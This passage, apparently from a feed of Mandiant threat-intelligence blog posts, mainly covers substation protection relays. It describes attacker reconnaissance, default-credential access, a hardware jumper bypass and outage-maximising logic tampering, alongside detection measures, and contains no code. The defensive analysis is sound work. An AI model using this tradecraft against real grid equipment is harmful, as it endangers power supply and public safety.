isolated recovery environment is not just a backup strategy, it is a resilience strategy.</span></p>\n<p><span style=\"vertical-align: baseline;\">It assumes breach. It accepts that visibility may be lost during a crisis. And it gives defenders a place to regroup, investigate, and rebuild.</span></p>\n<p><span style=\"vertical-align: baseline;\">The Mandiant </span><span style=\"font-style: italic; vertical-align: baseline;\">M-Trends 2025</span><span style=\"vertical-align: baseline;\"> report makes it clear; the cost of ransomware isn't just in ransom paid, but in days or weeks of downtime, regulatory penalties, and reputation loss. The cost of building an IRE is less than a breach, and the peace of mind it offers is far greater.</span></p>\n<p><span style=\"vertical-align: baseline;\">For deeper technical guidance on building secure recovery workflows or assessing your current recovery posture, </span><a href=\"https://cloud.google.com/security/consulting/mandiant-services\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Mandiant Consulting</span></a><span style=\"vertical-align: baseline;\"> offers strategic workshops and assessment services.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Acknowledgment</span></h2>\n<p><span style=\"vertical-align: baseline;\">A special thanks to Glenn Staniforth for their contributions.</span></p></div>"}
{"source": "Threat Intelligence", "title": "Protecting the Core: Securing Protection Relays in Modern Substations", "link": "https://cloud.google.com/blog/topics/threat-intelligence/securing-protection-relays-modern-substations/", "published": "Mon, 30 Jun 2025 14:00:00 +0000", "summary": "<div class=\"block-paragraph_advanced\"><p>Written by: Seemant Bisht, Chris Sistrunk, Shishir Gupta, Anthony Candarini, Glen Chason, Camille Felx Leduc</p>\n<hr /></div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">Introduction — Why Securing Protection Relays Matters More Than Ever</span></h2>\n<p><span style=\"vertical-align: baseline;\">Substations are critical nexus points in the power grid, transforming high-voltage electricity to ensure its safe and efficient delivery from power plants to millions of end-users. At the core of a modern substation lies the protection relay: an intelligent electronic device (IED) that plays a critical role in maintaining the stability of the power grid by continuously monitoring voltage, current, frequency, and phase angle. Upon detecting a fault, it instantly isolates the affected zone by tripping circuit breakers, thus preventing equipment damage, fire hazards, and cascading power outages.</span></p>\n<p><span style=\"vertical-align: baseline;\">As substations become more digitized, incorporating IEC 61850, Ethernet, USB, and remote interfaces, relays are no longer isolated devices, but networked elements in a broader SCADA network. While this enhances visibility and control, it also exposes relays to digital manipulation and cyber threats. If compromised, a relay can be used to issue false trip commands, alter breaker logic, and disable fault zones. Attackers can stealthily modify vendor-specific logic, embed persistent changes, and even erase logs to avoid detection. A coordinated attack against multiple critical relays can lead to a cascading failure across the grid, potentially causing a large-scale blackout.</span></p>\n<p><span style=\"vertical-align: baseline;\">This threat is not theoretical. State-sponsored adversaries have repeatedly demonstrated their capability to cause widespread blackouts, as seen in the </span><a href=\"https://attack.mitre.org/campaigns/C0025/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">INDUSTROYER (2016)</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/industroyer-v2-old-malware-new-tricks\"><span style=\"text-decoration: underline; vertical-align: baseline;\">INDUSTROYER.V2 (2022)</span></a><span style=\"vertical-align: baseline;\">, and </span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/sandworm-disrupts-power-ukraine-operational-technology/\"><span style=\"text-decoration: underline; vertical-align: baseline;\">novel living-off-the-land technique (2022)</span></a><span style=\"vertical-align: baseline;\"> attacks in Ukraine, where they issued unauthorized commands over standard grid protocols. The attack surface extends beyond operational protocols to the very tools engineers rely on; as Claroty's Team82 revealed a <a href=\"https://claroty.com/team82/blog/siemens-digsi-4-protocol-vulnerability-affects-electric-substations\" rel=\"noopener\" target=\"_blank\">denial-of-service vulnerability in Siemens DIGSI 4 configuration software</a>. Furthermore, the discovery of malware toolkits like </span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/incontroller-state-sponsored-ics-tool\"><span style=\"text-decoration: underline; vertical-align: baseline;\">INCONTROLLER</span></a><span style=\"vertical-align: baseline;\"> shows attackers are developing specialized capabilities to map, manipulate, and disable protection schemes across multiple vendors.</span></p>\n<p><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">Recent events have further underscored the reality of these threats, with <span style=\"vertical-align: baseline;\">the <a href=\"https://www.cisa.gov/resources-tools/resources/iranian-cyber-actors-may-target-vulnerable-us-networks-and-entities-interest\" rel=\"noopener\" target=\"_blank\">U.S. government warning of</a></span><a href=\"https://www.cisa.gov/resources-tools/resources/iranian-cyber-actors-may-target-vulnerable-us-networks-and-entities-interest\" rel=\"noopener\" target=\"_blank\"> heightened risks</a> of Iranian cyberattacks targeting vital networks in the wake of geopolitical tensions. Iran-nexus threat actors such as UNC5691 (aka CyberAv3ngers) have a history of targeting operational technology, in some cases including U.S. water facilities. Similarly, persistent threats from China, such as UNC5135, which at least partially overlaps with publicly reported Volt Typhoon activity, demonstrate a strategic effort to embed within U.S. critical infrastructure for potential future disruptive or destructive cyberattacks. The tactics of these adversaries, which range from exploiting weak credentials to manipulating the very logic of protection devices, make the security of protection relays a paramount concern.</span></span></p>\n<p><span style=\"vertical-align: baseline;\">These public incidents mirror the findings from our own Operational Technology (OT) Red Team </span><a href=\"https://cloud.google.com/security/solutions/mandiant-operational-technology\"><span style=\"text-decoration: underline; vertical-align: baseline;\">simulations</span></a><span style=\"vertical-align: baseline;\">, which consistently reveal accessible remote pathways into local substation networks and underscore the potential for adversaries to manipulate protection relays within national power grids.</span></p>\n<p><span style=\"vertical-align: baseline;\">Protection relays are high-value devices, and prime targets for cyber-physical attacks targeting substation automation systems and grid management systems. Securing protection relays is no longer just a best practice; it's absolutely essential for ensuring the resilience of both transmission and distribution power grids.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Inside a Substation — Components and Connectivity</span></h2>\n<p><span style=\"vertical-align: baseline;\">To fully grasp the role of protection relays within the substation, it's important to understand the broader ecosystem they operate in. Modern substations are no longer purely electrical domains. They are cyber-physical environments where IEDs, deterministic networking, and real-time data exchange work in concert to deliver grid reliability, protection, and control.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Core Components</span></h3>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Protection &amp; Control Relays (IEDs): Devices such as the SEL-451, Hitachi REL670, GE D60, and Siemens 7SJ85 serve as the brains of both protection and control. They monitor current, voltage, frequency, and phase angle, and execute protection schemes like:</span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Overcurrent (ANSI 50/51)</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Distance protection (ANSI 21)</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Differential protection (ANSI 87)</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Under/over-frequency (ANSI 81)</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Synch-check (ANSI 25) </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Auto-reclose (ANSI 79)</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Breaker failure protection (ANSI 50BF)</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Logic-based automation and lockout (e.g., ANSI 94)<br /><br /></span><span style=\"font-style: italic;\">(Note: These ANSI function numbers follow the IEEE Standard C37.2 and are universally used across vendors to denote protective functions.)</span></p>\n</li>\n</ul>\n</ul>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Circuit Breakers &amp; Disconnectors: High-voltage switching devices operated by relays to interrupt fault current or reconfigure line sections. Disconnectors provide mechanical isolation and are often interlocked with breaker status to prevent unsafe operation.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Current Transformers (CTs) &amp; Potential Transformers (PTs): Instrument transformers that step down high voltage and current for safe and precise measurement. These form the primary sensing inputs for protection and metering functions.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Station Human-Machine Interfaces (HMIs): Provide local visualization and control for operators. HMIs typically connect to relay networks via the station bus, offering override, acknowledgment, and command functions without needing SCADA intervention.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Remote Terminal Units (RTUs) or Gateway Devices: In legacy or hybrid substations, RTUs aggregate telemetry from field devices and forward it to control centers. In fully digital substations, this function may be handled by SCADA gateways or station-level IEDs that natively support IEC 61850 or legacy protocol bridging.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Time Synchronization Devices: GPS clocks or PTP servers are deployed to maintain time alignment across relays, sampled value streams, and event logs. This is essential for fault location, waveform analysis, and sequence of events (SoE) correlation.</span></p>\n</li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\">Network Architecture</span></h3>\n<p><span style=\"vertical-align: baseline;\">Modern digital substations are engineered with highly segmented network architectures to ensure deterministic protection, resilient automation, and secure remote access. These systems rely on fiber-based Ethernet communication and time-synchronized messaging to connect physical devices, intelligent electronics, SCADA systems, and engineering tools across three foundational layers.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Substation Network Architecture\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/substation-network-figure1.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 1: Substation Network Architecture</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Network Topologies: Substations employ redundant Ethernet designs to achieve high availability and zero-packet-loss communication, especially for protection-critical traffic.</span></p>\n<p><span style=\"vertical-align: baseline;\">Common topologies include:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">RSTP (Rapid Spanning Tree Protocol) – Basic redundancy by blocking loops in switched networks</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">PRP (Parallel Redundancy Protocol) – Simultaneous frame delivery over two independent paths</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">HSR (High-availability Seamless Redundancy) – Ring-based protocol that allows seamless failover for protection traffic</span></p>\n</li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\">Communication Layers: Zones and Roles</span></h3>\n<p><span style=\"vertical-align: baseline;\">Modern substations are structured into distinct functional network layers, each responsible for different operations, timing profiles, and security domains. Understanding this layered architecture is critical to both operational design and cyber risk modeling.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Process Bus / Bay Level Communication</span></p>\n<ul>\n<li>This is the most time-sensitive layer in the substation. It handles deterministic, peer-to-peer communication between IEDs (Intelligent Electronic Devices), Merging Units (MUs), and digital I/O modules that directly interact with primary field equipment.\n<ul>\n<li><span style=\"vertical-align: baseline;\">Includes:</span>\n<ul>\n<li><span style=\"vertical-align: baseline;\">Protection and Control IEDs - Relay logic for fault detection and breaker actuation</span></li>\n<li><span style=\"vertical-align: baseline;\">MUs - Convert CT/PT analog inputs into digitized Sampled Values (SV)</span></li>\n<li><span style=\"vertical-align: baseline;\">IED I/O Modules - Digitally interface with trip coils and status contacts on breakers</span></li>\n<li><span style=\"vertical-align: baseline;\">Circuit Breakers, CTs, and PTs - Primary electrical equipment connected through MUs and I/O</span></li>\n<li><span style=\"vertical-align: baseline;\">Master clock or time source - Ensures time-aligned SV and event data using PTP (IEEE 1588) or IRIG-B</span></li>\n<li>Protocols:\n<ul>\n<li><span style=\"vertical-align: baseline;\">IEC 61850-8-1 (GOOSE) - Protection logic, trip/block signaling</span></li>\n<li>IEC 61850-9-2 (SV) - Real-time sampled analog measurements</li>\n<li>Time Sync (PTP/IRIG-B) - Sub-millisecond alignment across protection systems</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Station Bus / Substation Automation LAN (Supervisory and Control Layer)</span></p>\n<ul>\n<li>The Station Bus connects IEDs, local operator systems, SCADA gateways, and the Substation Automation System (SAS). It is responsible for coordination, data aggregation, event recording, and forwarding data to control centers.\n<ul>\n<li><span style=\"vertical-align: baseline;\">Includes:</span>\n<ul>\n<li><span style=\"vertical-align: baseline;\">SAS - Central event and logic manager</span></li>\n<li><span style=\"vertical-align: baseline;\">HMIs - Local operator access</span></li>\n<li><span style=\"vertical-align: baseline;\">Engineering Workstation (EWS) - Access point for authorized relay configuration and diagnostics</span></li>\n<li><span style=\"vertical-align: baseline;\">RTUs / SCADA Gateways - Bridge to EMS/SCADA networks</span></li>\n<li><span style=\"vertical-align: baseline;\">Managed Ethernet Switches (PRP/HSR) - Provide reliable communication paths</span></li>\n</ul>\n</li>\n<li>Protocols:\n<ul>\n<li>MMS (IEC 61850-8-1) - Relay supervision, config edits, event reporting, time sync</li>\n<li>IEC 60870-5-104 / DNP3 - Upstream telemetry to control center</li>\n<li>Modbus (legacy) - Field device communication</li>\n<li>SNMP (secured) - Network health monitoring</li>\n</ul>\n</li>\n<li>Engineering Access (Role-Based, Cross-Layer): Engineering access is not a stand-alone communication layer but a privileged access path used by protection engineers and field technicians to perform maintenance, configuration, and diagnostics.\n<ul>\n<li>Access Components:\n<ul>\n<li>EWS - Direct relay interface via MMS or console</li>\n<li>Jump Servers / VPNs - Controlled access to remote or critical segments</li>\n<li>Terminal/ Serial Consoles - Used for maintenance and troubleshooting purposes</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h2><span style=\"vertical-align: baseline;\">What Protection Relays Really Do</span></h2>\n<p><span style=\"vertical-align: baseline;\">In modern digital substations, protection relays—more accurately referred to as IEDs—have evolved far beyond basic trip-and-alarm functions. These devices now serve as cyber-physical control points, responsible not only for detecting faults in real time but also for executing programmable logic, recording event data, and acting as communication intermediaries between digital and legacy systems.</span></p>\n<p><span style=\"vertical-align: baseline;\">At their core, IEDs monitor electrical parameters, such as voltage, current, frequency, and phase angle, and respond to conditions like overcurrent, ground faults, and frequency deviations. Upon fault detection, they issue trip commands to circuit breakers—typically within one power cycle (e.g., 4–20 ms)—to safely isolate the affected zone and prevent equipment damage or cascading outages.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Beyond traditional protection: </span><span style=\"vertical-align: baseline;\">Modern IEDs provide a rich set of capabilities that make them indispensable in fully digitized substations.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Trip Logic Processing: </span><span style=\"vertical-align: baseline;\">Integrated logic engines (e.g., SELogic, FlexLogic, CFC) evaluate multiple real-time conditions to determine if, when, and how to trip, block, or permit operations.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Event Recording and Fault Forensics: </span><span style=\"vertical-align: baseline;\">Devices maintain Sequence of Events (SER) logs and capture high-resolution oscillography (waveform data), supporting post-event diagnostics and root-cause analysis.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Local Automation Capabilities: </span><span style=\"vertical-align: baseline;\">IEDs can autonomously execute transfer schemes, reclose sequences, interlocking, and alarm signaling often without intervention from SCADA or a centralized controller.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Protocol Bridging and Communication Integration: </span><span style=\"vertical-align: baseline;\">Most modern relays support and translate between multiple protocols, including IEC 61850, DNP3, Modbus, and IEC 60870-5-104, enabling them to function as data gateways or edge translators in hybrid communication environments.</span></p>\n</li>\n</ul>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Application across the grid: <span style=\"vertical-align: baseline;\">These devices ensure rapid fault isolation, coordinated protection, and reliable operation across transmission, distribution, and industrial networks.</span></span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Transmission and distribution lines (e.g., SIPROTEC)</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Power Transformers (e.g., ABB RET615)</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Feeders, Motors and industrial loads (e.g., GE D60)</span></p>\n</li>\n</ul>\n</li>\n</ul>\n<h2><span style=\"vertical-align: baseline;\">How Attackers Can Recon and Target Protection Relays</span></h2>\n<p><span style=\"vertical-align: baseline;\">As substations evolve into digital control hubs, their critical components, particularly protection relays, are no longer isolated devices. These IEDs are now network-connected through Ethernet, serial-to-IP converters, USB interfaces, and in rare cases, tightly controlled wireless links used for diagnostics or field tools.</span></p>\n<p><span style=\"vertical-align: baseline;\">While this connectivity improves maintainability, remote engineering access, and real-time visibility, it also expands the cyberattack surface exposing relays to risks of unauthorized logic modification, protocol exploitation, or lateral movement from compromised engineering assets.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Reconnaissance From the Internet</span></h3>\n<p><span style=\"vertical-align: baseline;\">Attackers often begin with open-source intelligence (OSINT), building a map of the organization's digital and operational footprint. They aren't initially looking for IEDs or substations; they're identifying the humans who manage them.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Social Recon: Using LinkedIn, engineering forums, or vendor webinars, attackers look for job titles like \"Substation Automation Engineer,\" \"Relay Protection Specialist,\" or \"SCADA Administrator.\"</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">OSINT Targeting: Public resumes and RFI documents may reference software like DIGSI, PCM600, or AcSELerator. Even PDF metadata from utility engineering documents can reveal usernames, workstation names, or VPN domains.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Infrastructure Scanning: Tools like Shodan or Censys help identify exposed VPNs, engineering portals, and remote access gateways. If these systems support weak authentication or use outdated firmware, they become initial entry points.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Exploitation of Weak Vendor Access: Many utilities still use stand-alone VPN credentials for contractors and OEM vendors. These accounts often bypass centralized identity systems, lack 2FA, and are reused across projects.</span></p>\n</li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\">Reconnaissance in IT — Mapping the Path to OT</span></h3>\n<p><span style=\"vertical-align: baseline;\">Once an attacker gains a foothold within the IT network—typically through phishing, credential theft, or exploiting externally exposed services—their next objective shifts toward internal reconnaissance. The target is not just domain dominance, but lateral movement toward OT-connected assets such as substations or Energy Management Systems (EMS).</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Domain Enumeration: Using tools like BloodHound, attackers map Active Directory for accounts, shares, and systems tagged with OT context (e.g., usernames like scada_substation_admin, and groups like scada_project and scada_communication).</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">This phase allows the attacker to pinpoint high-value users and their associated devices, building a shortlist of engineering staff, contractors, or control center personnel who likely interface with OT assets.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Workstation &amp; Server Access: </span>Armed with domain privileges and OT-centric intelligence, the attacker pivots to target the workstations or terminal servers used by the identified engineers. These endpoints are rich in substation-relevant data, such as:</p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p>Relay configuration files (.cfg, .prj, .set)</p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p>VPN credentials or profiles for IDMZ access</p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p>Passwords embedded in automation scripts or connection managers</p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p>Access logs or RDP histories indicating commonly used jump hosts</p>\n</li>\n</ul>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">At this stage, the attacker is no longer scanning blindly; they're executing highly contextual moves to identify paths from IT into OT.</span></p>\n<h3><span style=\"vertical-align: baseline;\">IDMZ Penetration — Crossing the Last Boundary</span></h3>\n<p><span style=\"vertical-align: baseline;\">Using gathered VPN credentials, hard-coded SSH keys, or jump host details, the attacker attempts to cross into the DMZ. This zone typically mediates communication between IT and OT, and may be accessed via:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Engineering jump hosts (dual-homed systems, often less monitored)</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Poorly segmented RDP gateways with reused credentials</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Exposed management ports on firewalls or remote access servers</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Once in the IDMZ, attackers map accessible subnets and identify potential pathways into live substations.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Substation Discovery and Technical Enumeration</span></h3>\n<p><span style=\"vertical-align: baseline;\">Once an attacker successfully pivots into the substation network often via compromised VPN credentials, engineering jump hosts, or dual-homed assets bridging corporate and OT domains—the next step is to quietly enumerate the substation landscape. At this point, they are no longer scanning broadly but conducting targeted reconnaissance to identify and isolate high-value assets, particularly protection relays.</span></p>\n<p><span style=\"vertical-align: baseline;\">Rather than using noisy tools like nmap with full port sweeps, attackers rely on stealthier techniques tailored for industrial networks. These include passive traffic sniffing and protocol-specific probing to avoid triggering intrusion detection systems or log correlation engines. For example, using custom Python or Scapy scripts, the attacker might issue minimal handshake packets for protocols such as IEC 61850 MMS, DNP3, or Modbus, observing how devices respond to crafted requests. This helps fingerprint device types and capabilities without sending bulk probes.</span></p>\n<p><span style=\"vertical-align: baseline;\">Simultaneously, MAC address analysis plays a crucial role in identifying vendors. Many industrial devices use identifiable prefixes unique to specific power control system manufacturers. Attackers often leverage this to differentiate protection relays from HMIs, RTUs, or gateways with a high degree of accuracy.</span></p>\n<p><span style=\"vertical-align: baseline;\">Additionally, by observing mirrored traffic on span ports or through passive sniffing on switch trunks, attackers can detect GOOSE messages, Sampled Values (SV), or heartbeat signals indicative of live relay communication. These traffic patterns confirm the presence of active IEDs, and in some cases, help infer the device's operational role or logical zone.</span></p>\n<p><span style=\"vertical-align: baseline;\">Once relays, protocol gateways, and engineering HMIs have been identified, the attacker begins deeper technical enumeration. At this stage, they analyze which services are exposed on each device such as Telnet, HTTP, FTP or MMS, and gather banner information or port responses that reveal firmware versions, relay models or serial numbers. Devices with weak authentication or legacy configurations are prioritized for exploitation.</span></p>\n<p><span style=\"vertical-align: baseline;\">The attacker may next attempt to log in using factory-set or default credentials, which are often easily obtainable from device manuals. Alarmingly, these credentials are often still active in many substations due to lax commissioning processes. If login is successful, the attacker escalates from passive enumeration to active control—gaining the ability to view or modify protection settings, trip logic, and relay event logs.</span></p>\n<p><span style=\"vertical-align: baseline;\">If the relays are hardened with proper credentials or access controls, attackers might try other methods, such as accessing rear-panel serial ports via local connections or probing serial-over-IP bridges linked to terminal servers. Some adversaries have even used vendor software (e.g., DIGSI, AcSELerator, PCM600) found on compromised engineering workstations to open relay configuration projects, review programmable logic (e.g., SELogic or FlexLogic), and make changes through trusted interfaces.</span></p>\n<p><span style=\"vertical-align: baseline;\">Another critical risk in substation environments is the presence of undocumented or hidden device functionality. As highlighted in </span><a href=\"https://www.cisa.gov/news-events/ics-advisories/icsa-24-095-02\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">CISA advisory ICSA-24-095-02</span></a><span style=\"vertical-align: baseline;\">, SEL 700-series protection relays were found to contain undocumented capabilities accessible to privileged users.</span></p>\n<p><span style=\"vertical-align: baseline;\">Separately, some relays may expose backdoor Telnet access through hard-coded or vendor diagnostic accounts. These interfaces are often enabled by default and left undocumented, giving attackers an opportunity to inject firmware, wipe configurations, or issue commands that can directly trip or disable breakers.</span></p>\n<p><span style=\"vertical-align: baseline;\">By the end of this quiet but highly effective reconnaissance phase, the attacker has mapped out the protection relay landscape, assessed device exposure, and identified access paths. They now shift from understanding the network to understanding what each relay actually controls, entering the next phase: process-aware enumeration.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Process-Aware Enumeration</span></h3>\n<p><span style=\"vertical-align: baseline;\">Once attackers have quietly mapped out the substation network (identifying protection relays, protocol gateways, engineering HMIs, and confirming which devices expose insecure services) their focus shifts from surface-level reconnaissance to gaining operational context. Discovery alone isn't enough. For any compromise to deliver strategic impact, adversaries must understand how these devices interact with the physical power system.</span></p>\n<p><span style=\"vertical-align: baseline;\">This is where process-aware enumeration begins. The attacker is no longer interested in just controlling any relay they want to control the right relay. That means understanding what each device protects, how it's wired into the breaker scheme, and what its role is within the substation topology.</span></p>\n<p><span style=\"vertical-align: baseline;\">Armed with access to engineering workstations or backup file shares, the attacker reviews substation single-line diagrams (SLDs), often from SCADA HMI screens or documentation from project folders. These diagrams reveal the electrical architecture—transformers, feeders, busbars—and show exactly where each relay fits. Identifiers like \"BUS-TIE PROT\" or \"LINE A1 RELAY\" are matched against configuration files to determine their protection zone.</span></p>\n<p><span style=\"vertical-align: baseline;\">By correlating relay names with breaker control logic and protection settings, the attacker maps out zone hierarchies: primary and backup relays, redundancy groups, and dependencies between devices. They identify which relays are linked to auto-reclose logic, which ones have synch-check interlocks, and which outputs are shared across multiple feeders.</span></p>\n<p><span style=\"vertical-align: baseline;\">This insight enables precise targeting. For example, instead of blindly disabling protection across the board, which would raise immediate alarms, the attacker may suppress tripping on a backup relay while leaving the primary untouched. Or, they might modify logic in such a way that a fault won't be cleared until the disturbance propagates, creating the conditions for a wider outage.</span></p>\n<p><span style=\"vertical-align: baseline;\">At this stage, the attacker is not just exploiting the relay as a networked device. They're treating it as a control surface for the substation itself. With deep process context in hand, they move from reconnaissance to exploitation: manipulating logic, altering protection thresholds, injecting malicious firmware, or spoofing breaker commands and because their changes are aligned with system topology, they maximize impact while minimizing detection.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Practical Examples of Exploiting Protection Relays</span></h2>\n<p><span style=\"vertical-align: baseline;\">The fusion of network awareness and electrical process understanding makes modern substation attacks particularly dangerous—and why protection relays, when compromised, represent one of the highest-value cyber-physical targets in the grid.</span></p>\n<p><span style=\"vertical-align: baseline;\">To illustrate how such knowledge is operationalized by attackers, let's examine a practical example involving the SEL-311C relay, a device widely deployed across substations. </span><span style=\"vertical-align: baseline;\">Note:</span><span style=\"vertical-align: baseline;\"> While this example focuses on SEL, the tactics described here apply broadly to comparable relays from other major OEM vendors such as ABB, GE, Siemens, and Schneider Electric. In addition, the information presented in this section does not constitute any unknown vulnerabilities or proprietary information, but instead demonstrates the potential for an attacker to use built-in device features to achieve adversarial objectives.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Attack Vectors for a SEL-311C Protection Relay\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/sel-311c-figure2.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 2: Attack Vectors for a SEL-311C Protection Relay</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Physical Access</span></h3>\n<p><span style=\"vertical-align: baseline;\">If an attacker gains physical access to a protection relay, either through the front panel or by opening the enclosure they can trigger a hardware override by toggling the internal access jumper, typically located on the relay's main board. This bypasses all software-based authentication, granting unrestricted command-level access without requiring a login. Once inside, the attacker can modify protection settings, reset passwords, disable alarms, or issue direct breaker commands effectively assuming full control of the relay.</span></p>\n<p><span style=\"vertical-align: baseline;\">However, such intrusions can be detected, if the right safeguards are in place. Most modern substations incorporate electronic access control systems (EACS) and SCADA-integrated door alarms. If a cabinet door is opened without an authorized user logged as onsite (via badge entry or operator check-in), alerts can be escalated to dispatch field response teams or security personnel.</span></p>\n<p><span style=\"vertical-align: baseline;\">Relays themselves provide telemetry for physical access events. For instance, SEL relays pulse the ALARM contact output upon use of the 2ACCESS command, even when the correct password is entered. Failed authentication attempts assert the BADPASS logic bit, while SETCHG flags unauthorized setting modifications. These SEL WORDs can be continuously monitored through SCADA or security detection systems for evidence of tampering.</span></p>\n<p><span style=\"vertical-align: baseline;\">Toggling the jumper to bypass relay authentication typically requires power-cycling the device, a disruptive action that can itself trigger alarms or be flagged during operational review.</span></p>\n<p><span style=\"vertical-align: baseline;\">To further harden the environment, utilities increasingly deploy centralized relay management suites (e.g., SEL Grid Configurator, GE Cyber Asset Protection, or vendor-neutral tools like Subnet PowerSystem Center) that track firmware integrity, control logic uploads, and enforce version control tied to access control mechanisms.</span></p>\n<p><span style=\"vertical-align: baseline;\">In high-assurance deployments, relay configuration files are often encrypted, access-restricted, and protected by multi-factor authentication, reducing the risk of rollback attacks or lateral movement even if the device is 